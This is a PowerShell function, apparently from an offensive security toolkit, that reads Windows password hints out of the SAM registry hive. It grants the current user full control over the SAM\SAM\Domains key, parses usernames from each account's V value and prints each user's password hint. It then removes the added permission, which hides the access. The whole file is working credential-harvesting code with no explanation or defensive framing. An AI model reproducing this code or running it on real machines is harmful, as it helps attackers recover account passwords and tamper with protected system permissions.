function Get-PassHints {
[CmdletBinding()]
Param ()
    $rule = New-Object System.Security.AccessControl.RegistryAccessRule (
    [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
    "FullControl",
    [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit",
    [System.Security.AccessControl.PropagationFlags]"None",
    [System.Security.AccessControl.AccessControlType]"Allow")
    $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
    "SAM\SAM\Domains",
    [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
    [System.Security.AccessControl.RegistryRights]::ChangePermissions)
    $acl = $key.GetAccessControl()
    $acl.SetAccessRule($rule)
    $key.SetAccessControl($acl)
    function Get-UserName([byte[]]$V)
    {
        if (-not $V) {return $null};
        $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
        $len = [BitConverter]::ToInt32($V[0x10..0x13],0);
        return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
    }
    $users = Get-ChildItem HKLM:\SAM\SAM\Domains\Account\Users\
    $j = 0
    foreach ($key in $users)
    {
        $value = Get-ItemProperty $key.PSPath
        $j++
        foreach ($hint in $value)
        {
            if ($hint.UserPasswordHint)
            {
                $username = Get-UserName($hint.V)
                $passhint = ([text.encoding]::Unicode).GetString($hint.UserPasswordHint)
                Write-Output "$username`:$passhint"
            }
        }
    }
    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null
    Set-Acl HKLM:\SAM\SAM\Domains $acl
}
